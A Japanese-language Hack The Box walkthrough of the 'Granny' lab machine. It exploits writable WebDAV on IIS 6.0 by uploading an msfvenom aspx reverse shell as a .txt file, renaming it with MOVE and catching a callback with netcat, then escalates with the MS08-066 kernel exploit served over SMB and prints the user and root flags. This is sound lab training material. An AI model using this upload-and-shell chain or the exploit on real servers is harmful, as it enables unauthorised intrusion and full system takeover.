https://app.hackthebox.com/machines/Granny  
「Grandpa」マシンと同じくiisをrceして初期侵入できるが、このマシンは別の手段使用

## STEP 1
```sh
└─$ rustscan -a 10.129.95.234 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.95.234:80
10.129.95.234 -> [80]
```

## STEP 2
80番にアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Granny_01.png">  
httpメソッドを確認すると、OPTIONSメソッドやMOVEメソッドなどいろいろ確認
```sh
└─$ nmap -n -Pn -p80 --script=http-methods 10.129.95.234
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 04:53 EDT
Nmap scan report for 10.129.95.234
Host is up (0.31s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
```
OPTIONSメソッドで使えるメソッドを確認すると、webdavっぽいことを確認
```sh
└─$ curl -X OPTIONS -I http://10.129.95.234           
HTTP/1.1 200 OK
Date: Sun, 10 Aug 2025 11:55:26 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
MS-Author-Via: MS-FP/4.0,DAV
Content-Length: 0
Accept-Ranges: none
DASL: <DAV:sql>
DAV: 1, 2
Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Cache-Control: private
```
webdavが動いているかテスト  
拡張子txtをアップロードできたためaspx形式のリバースシェルペイロードを拡張子txtでアップロードし  
moveメソッドで拡張子aspxに変更・アクセスすればリバースシェルをとれるかも
```sh
└─$ davtest -url http://10.129.95.234 -cleanup 
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.129.95.234
********************************************************
NOTE    Random string for this session: FMT9PIdSEZflF9
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9
********************************************************
 Sending test files
PUT     shtml   FAIL
PUT     aspx    FAIL
PUT     txt     SUCCEED:        http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.txt
PUT     pl      SUCCEED:        http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.pl
PUT     asp     FAIL
PUT     php     SUCCEED:        http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.php
PUT     html    SUCCEED:        http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.html
PUT     cfm     SUCCEED:        http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.cfm
PUT     jhtml   SUCCEED:        http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.jhtml
PUT     cgi     FAIL
PUT     jsp     SUCCEED:        http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.jsp
********************************************************
 Checking for test file execution
EXEC    txt     SUCCEED:        http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.txt
EXEC    txt     FAIL
EXEC    pl      FAIL
EXEC    php     FAIL
EXEC    html    SUCCEED:        http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.html
EXEC    html    FAIL
EXEC    cfm     FAIL
EXEC    jhtml   FAIL
EXEC    jsp     FAIL
********************************************************
 Cleaning up
DELETE          FAIL:   http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9

********************************************************
/usr/bin/davtest Summary:
Created: http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9
PUT File: http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.txt
PUT File: http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.pl
PUT File: http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.php
PUT File: http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.html
PUT File: http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.cfm
PUT File: http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.jhtml
PUT File: http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.jsp
Executes: http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.txt
Executes: http://10.129.95.234/DavTestDir_FMT9PIdSEZflF9/davtest_FMT9PIdSEZflF9.html
```
msfvenomでリバースシェルペイロード作成
```sh
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.23 LPORT=4444 -f aspx -o shell.txt
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2720 bytes
Saved as: shell.txt
```
putメソッドでtxt形式アップロード、moveメソッドでaspx形式に変更
```sh
└─$ cadaver http://10.129.95.234
dav:/> put shell.txt shell.txt
Uploading shell.txt to `/shell.txt':
Progress: [=============================>] 100.0% of 2720 bytes succeeded.

dav:/> move shell.txt shell.aspx
Moving `/shell.txt' to `/shell.aspx': failed:
Could not parse response: XML parse error at line 1: Extra content at the end of the document

dav:/> ls
Listing collection `/': succeeded.
Coll:   _private                               0  Apr 12  2017
Coll:   _vti_bin                               0  Apr 12  2017
Coll:   _vti_cnf                               0  Apr 12  2017
Coll:   _vti_log                               0  Apr 12  2017
Coll:   _vti_pvt                               0  Apr 12  2017
Coll:   _vti_script                            0  Apr 12  2017
Coll:   _vti_txt                               0  Apr 12  2017
Coll:   aspnet_client                          0  Apr 12  2017
Coll:   images                                 0  Apr 12  2017
        _vti_inf.html                       1754  Apr 12  2017
        iisstart.htm                        1433  Feb 21  2003
        pagerror.gif                        2806  Feb 21  2003
        postinfo.html                       2440  Apr 12  2017
        shell.aspx                          2720  Aug 10  2025
```
aspxにアクセスし、実行
```sh
└─$ curl http://10.129.95.234/shell.aspx
```
リバースシェル取得！しかしユーザフラグにすらアクセスできず
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.95.234] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>cd C:\"Documents and Settings"\Lakis
cd C:\"Documents and Settings"\Lakis
Access is denied.
```


## STEP 3
hotfixは一つのみ
```cmd
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 1 Hours, 48 Minutes, 27 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 736 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,282 MB
Page File: In Use:         188 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```
[windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)でカーネルエクスプロイトを探していく  
[MS08-066](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-066)が機能するっぽい
```sh
└─$ wget -nv https://github.com/SecWiki/windows-kernel-exploits/raw/refs/heads/master/MS08-066/ms08066%E6%8F%90%E6%9D%83(XP%202003).zip
2025-08-09 05:12:35 URL:https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/refs/heads/master/MS08-066/ms08066%E6%8F%90%E6%9D%83(XP%202003).zip [57071/57071] -> "ms08066提权(XP 2003).zip" [1]
                                                                                                                                                                                                                                            
└─$ unzip ms08066提权\(XP\ 2003\).zip
Archive:  ms08066提权(XP 2003).zip
   creating: ms08066提权(XP 2003)/
  inflating: ms08066提权(XP 2003)/ms08066.exe  
  inflating: ms08066提权(XP 2003)/ms08066提权 2003 xp.PNG

└─$ impacket-smbserver share ms08066提权\(XP\ 2003\)
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
PoCを配送するために、write権限のある「C:\ADFS」フォルダに移動
```cmd
c:\windows\system32\inetsrv>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                       Type             SID                                            Attributes                                        
================================ ================ ============================================== ==================================================
NT AUTHORITY\NETWORK SERVICE     User             S-1-5-20                                       Mandatory group, Enabled by default, Enabled group
Everyone                         Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
GRANNY\IIS_WPG                   Alias            S-1-5-21-1709780765-3897210020-3926566182-1005 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users    Alias            S-1-5-32-559                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE             Well-known group S-1-5-6                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization   Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                            Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group

c:\windows\system32\inetsrv>dir C:\
dir C:\
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\

04/12/2017  05:27 PM    <DIR>          ADFS
04/12/2017  05:04 PM                 0 AUTOEXEC.BAT
04/12/2017  05:04 PM                 0 CONFIG.SYS
04/12/2017  10:19 PM    <DIR>          Documents and Settings
04/12/2017  05:17 PM    <DIR>          FPSE_search
04/12/2017  05:17 PM    <DIR>          Inetpub
12/24/2017  08:21 PM    <DIR>          Program Files
09/16/2021  02:49 PM    <DIR>          WINDOWS
08/10/2025  02:16 PM    <DIR>          wmpub
               2 File(s)              0 bytes
               7 Dir(s)   1,327,628,288 bytes free

c:\windows\system32\inetsrv>icacls C:\ADFS
icacls C:\ADFS
C:\ADFS BUILTIN\Administrators:(F)
        BUILTIN\Administrators:(I)(OI)(CI)(F)
        NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
        CREATOR OWNER:(I)(OI)(CI)(IO)(F)
        BUILTIN\Users:(I)(OI)(CI)(RX)
        BUILTIN\Users:(I)(CI)(AD)
        BUILTIN\Users:(I)(CI)(WD)

Successfully processed 1 files; Failed processing 0 files

c:\windows\system32\inetsrv>cd C:\ADFS
cd C:\ADFS
```
エクスプロイト実行、成功！
ユーザフラグ、ルートフラグゲット！
```sh
C:\ADFS>copy \\10.10.16.23\share\ms08066.exe .
copy \\10.10.16.23\share\ms08066.exe .
        1 file(s) copied.

C:\ADFS>.\ms08066.exe
.\ms08066.exe

 MS08-0xx Windows Kernel Ancillary Function Driver Local Privilege Escalation Vulnerability Exploit 

         Create by SoBeIt. 

Kernel is \WINDOWS\system32\ntkrnlpa.exe
Kernel base address: 80800000
Major Version:5 Minor Version:2
Load Base:410000
HalDispatchTable Offset:8088e078
NtQueryIntervalProfile function entry address:8088e07c
Exploit finished.

C:\ADFS>type C:\"Documents and Settings"\Lakis\Desktop\user.txt
type C:\"Documents and Settings"\Lakis\Desktop\user.txt
700c5dc163014e22b3e408f8703f67d1

C:\ADFS>type C:\"Documents and Settings"\Administrator\Desktop\root.txt
type C:\"Documents and Settings"\Administrator\Desktop\root.txt
aa4beed1c0584445ab463a6747bd06e9
```
